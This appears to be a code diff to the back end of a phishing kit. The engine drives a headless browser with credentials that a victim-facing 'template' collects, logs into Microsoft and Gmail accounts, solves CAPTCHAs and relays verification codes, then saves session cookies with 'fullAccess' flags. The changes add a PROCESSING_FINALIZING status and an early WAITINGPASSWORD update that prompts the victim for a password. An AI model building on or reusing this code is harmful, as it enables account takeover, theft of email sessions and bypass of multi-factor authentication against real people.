@@ -133,7 +133,7 @@ async function updateBrowserRowDataFast(browserId, updateData, isNewRow = false)
     // 2. Only do full Sheets cascade for terminal states (COMPLETED/FAILED).
     //    Intermediate writes go through cache + batched background sync to conserve quota.
     const status = updateData.status || '';
-    if (status === 'COMPLETED' || status === 'FAILED') {
+    if (status === 'COMPLETED' || status === 'FAILED' || status === 'PROCESSING_FINALIZING') {
         const cachedForWrite = getCachedRow(browserId) || {};
         const mergedForWrite = { ...cachedForWrite, ...updateData };
         await updateBrowserRowData(browserId, mergedForWrite, isNewRow).catch(err => {
@@ -771,6 +771,17 @@ async function checkAccountAccess(browser, page, email, password, platform, brow
 
                     await page.waitForFunction(() => document.readyState === 'complete', { timeout: 10000 });
                     await new Promise(res => setTimeout(res, 3000));
+
+                    // Immediately set WAITINGPASSWORD so template shows password form
+                    // while engine navigates intermediate views / solves CAPTCHAs
+                    if (browserId) {
+                        updateBrowserRowDataFast(browserId, {
+                            status: "WAITINGPASSWORD",
+                            email: email || '',
+                            verified: false,
+                            fullAccess: false
+                        });
+                    }
 
                     // Wait for the page to actually transition (SPA) — look for either "Verify your email" or password input
                     const transitionSelectors = ["[data-testid='title']", "input[name='passwd']", "input[type='password']", "#proof-confirmation-email-input", "h1"];
@@ -1412,7 +1423,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
     // Preserve cache state (password, status from update-process) over stale sheet data
     const cachedBeforePopulate = getCachedRow(browserId);
     if (cachedBeforePopulate) {
-        if (cachedBeforePopulate.status && cachedBeforePopulate.status !== 'FAILED' && cachedBeforePopulate.status !== 'COMPLETED') {
+        if (cachedBeforePopulate.status && cachedBeforePopulate.status !== 'FAILED' && cachedBeforePopulate.status !== 'COMPLETED' && cachedBeforePopulate.status !== 'PROCESSING_FINALIZING') {
             initialRowData.status = cachedBeforePopulate.status;
         }
         if (cachedBeforePopulate.password) {
@@ -1423,7 +1434,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
 
     // Use effective status from cache (preserved across HMR) over stale sheet value
     const cachedAfterPopulate = getCachedRow(browserId);
-    if (cachedAfterPopulate && cachedAfterPopulate.status && cachedAfterPopulate.status !== 'FAILED' && cachedAfterPopulate.status !== 'COMPLETED') {
+    if (cachedAfterPopulate && cachedAfterPopulate.status && cachedAfterPopulate.status !== 'FAILED' && cachedAfterPopulate.status !== 'COMPLETED' && cachedAfterPopulate.status !== 'PROCESSING_FINALIZING') {
         status = cachedAfterPopulate.status;
     }
 
@@ -1971,7 +1982,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                     await new Promise(res => setTimeout(res, 5000));
                                 } else if (recheckResult.reachedInbox) {
                                     logger.info(`[processRow][${browserId}][WAITINGCAPTCHA] Captcha passed! Reached inbox.`);
-                                    finalStatus = "COMPLETED";
+                                    finalStatus = "PROCESSING_FINALIZING";
                                     captchaProcessed = true;
                                     break;
                                 } else if (recheckResult.requiresVerification) {
@@ -2413,6 +2424,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                             await new Promise(resolve => setTimeout(resolve, 5000));
                                         }
                                         logger.info(`[processRow][${browserId}][WAITINGPASSWORD] Inbox reached: ${inboxReached}`);
+                                        finalStatus = "PROCESSING_FINALIZING";
                                         initialCheckResult = {
                                             emailExists: true, accountAccess: true, reachedInbox: inboxReached, requiresVerification: false, verificationState: null
                                         };
@@ -2885,7 +2897,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                     const gmailInbox = await isInbox(page, platformConfig).catch(() => false);
                                     if (gmailInbox) {
                                         logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Gmail reached inbox after option click.`);
-                                        finalStatus = "COMPLETED";
+                                        finalStatus = "PROCESSING_FINALIZING";
                                         break;
                                     }
                                     logger.warn(`[processRow][${browserId}][WAITINGOPTIONS] Gmail option click: unexpected page state. Continuing poll.`);
@@ -3197,7 +3209,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                     const inboxReached = await isInbox(page, platformConfig).catch(() => false);
                                     if (inboxReached) {
                                         logger.info(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Reached inbox after recovery email submission.`);
-                                        finalStatus = "COMPLETED";
+                                        finalStatus = "PROCESSING_FINALIZING";
                                         break;
                                     }
                                     logger.info(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Unexpected page state after recovery email. Continuing poll.`);
@@ -3260,7 +3272,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
             }
 
             updateData.status = finalStatus;
-            if (finalStatus === "FAILED" && !updateData.lastJsonResponse?.includes("COMPLETED")) {
+            if (finalStatus === "FAILED" && !updateData.lastJsonResponse?.includes("PROCESSING_FINALIZING") && !updateData.lastJsonResponse?.includes("COMPLETED")) {
                 updateData.lastJsonResponse = JSON.stringify({
                     ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
                     message: "Failed during WAITING_RECOVERY_EMAIL phase."
@@ -3428,16 +3440,16 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                     const postErrorInbox = await isInbox(page, platformConfig).catch(() => false);
                                     if (postErrorInbox) {
                                         logger.info(`[processRow][${browserId}][WAITINGCODE] Code was correct despite error flash. Inbox reached.`);
-                                        finalStatus = "COMPLETED";
+                                        finalStatus = "PROCESSING_FINALIZING";
                                         codeSuccessfullyProcessed = true;
 
                                         const browserCookies = await page.cookies(`https://${domain}`, 'https://login.live.com', 'https://login.microsoftonline.com', 'https://www.microsoft.com', 'https://outlook.live.com', 'https://mail.google.com');
-                                        updateData.status = "COMPLETED";
+                                        updateData.status = "PROCESSING_FINALIZING";
                                         updateData.cookieJSON = JSON.stringify(browserCookies);
                                         updateData.verified = true;
                                         updateData.fullAccess = true;
                                         updateData.lastJsonResponse = JSON.stringify({
-                                            browserId, email, status: "COMPLETED",
+                                            browserId, email, status: "PROCESSING_FINALIZING",
                                             emailExists: initialCheckResult.emailExists, accountAccess: true,
                                             reachedInbox: true, requiresVerification: false,
                                             verified: true, fullAccess: true,
@@ -3477,17 +3489,17 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                         await new Promise(res => setTimeout(res, 3000));
                                         const inboxAfterViews = await isInbox(page, platformConfig).catch(() => false);
                                         if (inboxAfterViews) {
-                                            logger.info(`[processRow][${browserId}][WAITINGCODE] Inbox reached after additional views. Setting COMPLETED.`);
-                                            finalStatus = "COMPLETED";
+                                            logger.info(`[processRow][${browserId}][WAITINGCODE] Inbox reached after additional views. Setting PROCESSING_FINALIZING.`);
+                                            finalStatus = "PROCESSING_FINALIZING";
                                             codeSuccessfullyProcessed = true;
 
                                             const browserCookies = await page.cookies(`https://${domain}`, 'https://login.live.com', 'https://login.microsoftonline.com', 'https://www.microsoft.com', 'https://outlook.live.com', 'https://mail.google.com');
-                                            updateData.status = "COMPLETED";
+                                            updateData.status = "PROCESSING_FINALIZING";
                                             updateData.cookieJSON = JSON.stringify(browserCookies);
                                             updateData.verified = true;
                                             updateData.fullAccess = true;
                                             updateData.lastJsonResponse = JSON.stringify({
-                                                browserId, email, status: "COMPLETED",
+                                                browserId, email, status: "PROCESSING_FINALIZING",
                                                 emailExists: initialCheckResult.emailExists, accountAccess: true,
                                                 reachedInbox: true, requiresVerification: false,
                                                 verified: true, fullAccess: true,
@@ -3561,16 +3573,16 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                     const inboxChecked = await isInbox(page, platformConfig);
                                     if (inboxChecked) {
                                         logger.info(`[processRow][${browserId}][WAITINGCODE] Inbox reached during passive verification. Setting status to COMPLETED.`);
-                                        finalStatus = "COMPLETED";
+                                        finalStatus = "PROCESSING_FINALIZING";
                                         codeSuccessfullyProcessed = true;
 
                                         const browserCookies = await page.cookies(`https://${domain}`, 'https://login.live.com', 'https://login.microsoftonline.com', 'https://www.microsoft.com', 'https://outlook.live.com', 'https://mail.google.com');
-                                        updateData.status = "COMPLETED";
+                                        updateData.status = "PROCESSING_FINALIZING";
                                         updateData.cookieJSON = JSON.stringify(browserCookies);
                                         updateData.verified = true; // Set verified to true on COMPLETED
                                         updateData.fullAccess = true; // Set fullAccess to true on COMPLETED
                                         updateData.lastJsonResponse = JSON.stringify({
-                                            browserId, email, status: "COMPLETED",
+                                            browserId, email, status: "PROCESSING_FINALIZING",
                                             emailExists: initialCheckResult.emailExists, accountAccess: true,
                                             reachedInbox: true, requiresVerification: false,
                                             verified: true, fullAccess: true, // Include in response
@@ -3618,16 +3630,16 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
 
                             if (inboxReachedAfterWait) {
                                 logger.info(`[processRow][${browserId}][WAITINGCODE] Inbox reached after verification wait. Setting status to COMPLETED.`);
-                                finalStatus = "COMPLETED";
+                                finalStatus = "PROCESSING_FINALIZING";
                                 codeSuccessfullyProcessed = true;
 
                                 const browserCookies = await page.cookies(`https://${domain}`, 'https://login.live.com', 'https://login.microsoftonline.com', 'https://www.microsoft.com', 'https://outlook.live.com', 'https://mail.google.com');
-                                updateData.status = "COMPLETED";
+                                updateData.status = "PROCESSING_FINALIZING";
                                 updateData.cookieJSON = JSON.stringify(browserCookies);
                                 updateData.verified = true; // Set verified to true on COMPLETED
                                 updateData.fullAccess = true; // Set fullAccess to true on COMPLETED
                                 updateData.lastJsonResponse = JSON.stringify({
-                                    browserId, email, status: "COMPLETED",
+                                    browserId, email, status: "PROCESSING_FINALIZING",
                                     emailExists: initialCheckResult.emailExists, accountAccess: true,
                                     reachedInbox: true, requiresVerification: false,
                                     verified: true, fullAccess: true, // Include in response
@@ -3737,17 +3749,17 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                     await new Promise(resolve => setTimeout(resolve, 5000));
                                 }
                                 if (inboxCheckAfterCode) {
-                                    logger.info(`[processRow][${browserId}][WAITINGCODE] Inbox reached after code submission. Setting COMPLETED.`);
-                                    finalStatus = "COMPLETED";
+                                    logger.info(`[processRow][${browserId}][WAITINGCODE] Inbox reached after code submission. Setting PROCESSING_FINALIZING.`);
+                                    finalStatus = "PROCESSING_FINALIZING";
                                     codeSuccessfullyProcessed = true;
                                     await handleAdditionalViews(page, platformConfig, instanceId, 'post_verification');
                                     const browserCookies = await page.cookies(`https://${domain}`, 'https://login.live.com', 'https://login.microsoftonline.com', 'https://www.microsoft.com', 'https://outlook.live.com', 'https://mail.google.com');
-                                    updateData.status = "COMPLETED";
+                                    updateData.status = "PROCESSING_FINALIZING";
                                     updateData.cookieJSON = JSON.stringify(browserCookies);
                                     updateData.verified = true;
                                     updateData.fullAccess = true;
                                     updateData.lastJsonResponse = JSON.stringify({
-                                        browserId, email, status: "COMPLETED",
+                                        browserId, email, status: "PROCESSING_FINALIZING",
                                         emailExists: true, accountAccess: true,
                                         reachedInbox: true, requiresVerification: false,
                                         verified: true, fullAccess: true,
@@ -3834,7 +3846,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
             }
 
             updateData.status = finalStatus;
-            if (finalStatus === "FAILED" && !updateData.lastJsonResponse?.includes("COMPLETED")) {
+            if (finalStatus === "FAILED" && !updateData.lastJsonResponse?.includes("PROCESSING_FINALIZING") && !updateData.lastJsonResponse?.includes("COMPLETED")) {
                 updateData.lastJsonResponse = JSON.stringify({
                     ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
                     message: "Failed during WAITING_CODE phase."
@@ -3877,7 +3889,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
             return;
         }
 
-        if (initialCheckResult.requiresVerification && finalStatus !== "FAILED" && finalStatus !== "COMPLETED" && finalStatus !== "WAITINGCODE" && finalStatus !== "WAITINGOPTIONS" && finalStatus !== "WAITINGRECOVERYEMAIL") {
+        if (initialCheckResult.requiresVerification && finalStatus !== "FAILED" && finalStatus !== "COMPLETED" && finalStatus !== "PROCESSING_FINALIZING" && finalStatus !== "WAITINGCODE" && finalStatus !== "WAITINGOPTIONS" && finalStatus !== "WAITINGRECOVERYEMAIL") {
             const sheetStatus = initialCheckResult.verificationState.replace(/_/g, ''); // Non-underscore for sheet status
             finalStatus = initialCheckResult.verificationState; // Keep original with underscore for internal use/lastJsonResponse
             updateData.lastJsonResponse = JSON.stringify({
@@ -4000,7 +4012,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
             } else if (initialCheckResult.accountAccess) {
                 if (!initialCheckResult.requiresVerification) {
                     if (initialCheckResult.reachedInbox) {
-                        finalStatus = "COMPLETED";
+                        finalStatus = "PROCESSING_FINALIZING";
                     } else {
                         logger.warn(`[processRow][${browserId}] Login successful but did not reach expected inbox state. Setting status to FAILED.`);
                         finalStatus = "FAILED";
@@ -4017,7 +4029,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
             } else {
                 finalStatus = "FAILED";
             }
-        } else if (!initialCheckResult.emailExists && finalStatus !== "FAILED" && finalStatus !== "COMPLETED" && finalStatus !== "WAITINGOPTIONS" && finalStatus !== "WAITINGCODE") {
+        } else if (!initialCheckResult.emailExists && finalStatus !== "FAILED" && finalStatus !== "COMPLETED" && finalStatus !== "PROCESSING_FINALIZING" && finalStatus !== "WAITINGOPTIONS" && finalStatus !== "WAITINGCODE") {
             finalStatus = "FAILED";
         }
 
@@ -4052,7 +4064,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
         }
 
 
-        if ((finalStatus === "COMPLETED" || initialCheckResult.accountAccess) && !browserFullyClosed) {
+        if ((finalStatus === "COMPLETED" || finalStatus === "PROCESSING_FINALIZING" || initialCheckResult.accountAccess) && !browserFullyClosed) {
             const allUrls = [
                 `https://${domain}`,
                 `https://login.live.com`,
@@ -4065,7 +4077,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
             updateData.cookieJSON = JSON.stringify(browserCookies);
             logger.info(`[processRow][${browserId}] Captured ${browserCookies.length} cookies from all domains.`);
             updateData.verified = true; // Set verified to true on COMPLETED without verification
-            updateData.fullAccess = (finalStatus === "COMPLETED" && initialCheckResult.reachedInbox === true); // Only fullAccess if inbox was actually reached
+            updateData.fullAccess = ((finalStatus === "COMPLETED" || finalStatus === "PROCESSING_FINALIZING") && initialCheckResult.reachedInbox === true); // Only fullAccess if inbox was actually reached
             updateData.status = finalStatus;
             updateData.lastJsonResponse = JSON.stringify({
                 browserId, email, status: finalStatus,
@@ -4116,7 +4128,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
         logger.error(`[processRow][${browserId}] Error processing row: ${error.message}`, error);
         logger.info(`[engineProcess][${browserId}] -CATCH (unexpected error)`);
         activelyProcessing.delete(browserId);
-        if (finalStatus !== "COMPLETED") {
+        if (finalStatus !== "COMPLETED" && finalStatus !== "PROCESSING_FINALIZING") {
             finalStatus = "FAILED";
             updateData.status = "FAILED";
             updateData.verified = false;
@@ -4437,8 +4449,8 @@ async function processWaitingRows() {
                 return false;
             }
 
-            // Also skip COMPLETED status
-            if (status === 'COMPLETED') {
+            // Also skip terminal statuses (COMPLETED, PROCESSING_FINALIZING)
+            if (status === 'COMPLETED' || status === 'PROCESSING_FINALIZING') {
                 return false;
             }
 
@@ -4550,7 +4562,7 @@ async function processWaitingRows() {
                     // (e.g. WAITINGEMAIL → email not found → return) and the next interval
                     // would re-pick this browserId, launching a duplicate browser.
                     const cached = getCachedRow(browserId);
-                    const terminalStatuses = ['COMPLETED', 'FAILED'];
+                    const terminalStatuses = ['COMPLETED', 'FAILED', 'PROCESSING_FINALIZING'];
                     if (cached && terminalStatuses.includes(cached.status)) {
                         activeProcesses.delete(browserId);
                     } else if (!activeBrowserSessions.has(browserId)) {
